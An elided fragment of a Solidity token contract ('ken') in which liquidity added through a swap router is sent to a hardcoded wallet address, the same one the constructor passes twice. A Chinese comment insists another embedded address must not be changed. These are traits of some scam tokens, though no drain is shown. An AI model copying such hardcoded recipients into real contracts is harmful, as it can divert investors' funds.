        ...
        if (lpAmount > 0) {
            ...
            if (lpusdtt > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdtt, 0, 0, address(0xa0eF33D418cb2fd6002ED5f7A72D3E0E1da01897), block.timestamp
                );
            }
        }
    }
...
contract ken is AToken {
    constructor() AToken(
        ...
        18,//De
        10000,//Su 
        address(0xa0eF33D418cb2fd6002ED5f7A72D3E0E1da01897),//
        address(0xa0eF33D418cb2fd6002ED5f7A72D3E0E1da01897)//
    ){
    }
}